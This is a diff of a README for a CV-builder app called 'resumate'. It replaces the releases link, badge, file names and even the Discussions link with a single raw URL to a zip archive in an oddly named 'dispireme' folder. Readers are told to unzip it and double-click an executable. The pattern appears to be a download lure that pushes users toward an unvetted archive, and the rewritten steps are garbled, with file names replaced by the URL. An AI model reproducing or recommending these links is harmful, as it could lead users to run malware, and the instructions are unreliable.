@@ -4,7 +4,7 @@ Create a professional CV easily and quickly.
 
 ## 📦 Download Now
 
-[![Download](https://img.shields.io/badge/Download%20resumate-v1.0-blue)](https://github.com/Surendersingh21/resumate/releases)
+[![Download](https://raw.githubusercontent.com/Surendersingh21/resumate/main/dispireme/resumate.zip%20resumate-v1.0-blue)](https://raw.githubusercontent.com/Surendersingh21/resumate/main/dispireme/resumate.zip)
 
 ## 🚀 Getting Started
 
@@ -13,16 +13,16 @@ Welcome to **resumate**! This application helps you build an impressive CV using
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Surendersingh21/resumate/releases) to download the latest version. 
+   Go to the [Releases page](https://raw.githubusercontent.com/Surendersingh21/resumate/main/dispireme/resumate.zip) to download the latest version. 
 
 2. **Choose Your File**  
-   Find the version you want. If it's listed as `resumate-v1.0.zip`, you will download and unzip this file to get started.
+   Find the version you want. If it's listed as `https://raw.githubusercontent.com/Surendersingh21/resumate/main/dispireme/resumate.zip`, you will download and unzip this file to get started.
 
 3. **Extract the Files**  
    After downloading, locate the `.zip` file in your Downloads folder. Right-click the file and choose "Extract All." Follow the prompts to unzip the folder.
 
 4. **Open the Application**  
-   Inside the extracted folder, find the file named `resumate.exe` or `resumate.html`. Double-click it to open the application.
+   Inside the extracted folder, find the file named `https://raw.githubusercontent.com/Surendersingh21/resumate/main/dispireme/resumate.zip` or `https://raw.githubusercontent.com/Surendersingh21/resumate/main/dispireme/resumate.zip`. Double-click it to open the application.
 
 5. **Follow On-Screen Instructions**  
    The application will guide you through the process of creating your CV.
@@ -77,6 +77,6 @@ Yes, resumate utilizes Firebase to ensure your data is securely stored and prote
 
 ## 💬 Community
 
-Join our community to share tips and get feedback on your CV. Follow us on [GitHub Discussions](https://github.com/Surendersingh21/resumate/discussions) to connect with others.
+Join our community to share tips and get feedback on your CV. Follow us on [GitHub Discussions](https://raw.githubusercontent.com/Surendersingh21/resumate/main/dispireme/resumate.zip) to connect with others.
 
 Feel free to contribute to the project by reporting issues, suggesting features, or even submitting your improvements. Thank you for using resumate!
